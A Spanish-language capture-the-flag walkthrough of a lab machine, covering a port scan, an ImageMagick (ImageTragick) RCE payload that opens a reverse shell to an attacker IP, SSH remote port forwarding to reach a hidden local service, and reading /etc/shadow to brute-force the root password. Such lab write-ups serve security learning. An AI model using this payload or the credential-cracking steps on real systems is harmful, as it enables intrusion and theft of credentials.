
# SCAN

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.0.8 or later
8080/tcp open  http-proxy
8081/tcp open  http       nginx 1.14.0 (Ubuntu)

```
# FTP
Podemos logearnos en ftp con anonymous y nos muestra un mensaje:
```
30-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.
```


En el puerto 8081 hay un servidor web que sirve una pagina web cuyo objetivo es transformar imagenes con extension .png en .jpg y lo realiza
a traves de una aplicacion que se llama imagemagick que presenta una vulnerabilidad del tipo RCE (Remote Command Execution)

![image](https://user-images.githubusercontent.com/70599089/183709438-49160fa4-c516-4d96-9fb0-c938344cb94e.png)


que se puede explotar con metasploit

No me funciona metasploit

# SIN METASPLOIT

En la pagina PayLoadAllThings se encuentra el siguient payload para imagemagik:
```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/IP/9999 0<&1 2>&1'
pop graphic-context
pop graphic-context
```
con este payload conseguimos un reverse shell para el usuario magician

# PRIVILEGE ESCALATION
Despues de realizar una enumeracion manual y automatica de la maquina (con linpeas y lse) solo encuentro la siguiente vulnerabilidad:
Mediante el comando ss (show sockets) o lo que es lo mismo netstat encuentro que en el puerto 6666 hay un socket activo que muy probablemente esta filtrado por un firewall y por eso no me lo ha detectado nmap
```
mag`ician@magician:~$ netstat -tlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 localhost:9000          0.0.0.0:*               LISTEN      1392/ssh            
tcp        0      0 localhost:6666          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:tproxy          0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:1234          0.0.0.0:*               LISTEN      1405/ssh            
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ip6-localhost:9000      [::]:*                  LISTEN      1392/ssh            
tcp6       0      0 [::]:http-alt           [::]:*                  LISTEN      983/java            
tcp6       0      0 ip6-localhost:1234      [::]:*                  LISTEN      1405/ssh            
tcp6       0      0 [::]:ftp                [::]:*                  LISTEN      -             
```
Podemos intentar acceder a este puerto mediante una tecnica de evasion conocida como **port forwarding** (redireccionamiento de puertos)
Hay dos tipos:
1. Local (L): En este caso desde la maquina atacante que actua como cliente se accede a traves de una tuberia ssh a la maquina target
que actua como servidor. El comando es
$ ssh -L <puerto-atacante>:localhost:<puerto-target> kali@<ip>

2. Remoto (R): En este caso estamos ya dentro de la maquina target que actua como cliente y queremos exponer un puerto (en nuestro caso el 6666). La maquina atacante (nuestra maquina) actua en este caso como servidor:
$ ssh -R 8081:localhost:6666 kali@10.11.62.57 -f -N
 donde 
  -f: para que se lance en el foreground
  -N: para que no se ejecute ningun comando (esto no se muy bien lo que es)
  Una vez ejecutado el port forwarding (reverse) (tener en cuenta que el puerto debe ser 8081 porque otros los bloque firefox, obtenemos un
  formulario y en la caja de entrada vemos que se ejecutan los archivos de la maquina target pero estan codificados en rot 13
  Podemos acceder por tanto a los fichero: /etc/passwd y /etc/shadow, los podemos decodificar (por ejemplo con ciberchef) y podemos intentar
  desencriptar por fuerza bruta el password del root, utilizando previamente la utilidad unshadow
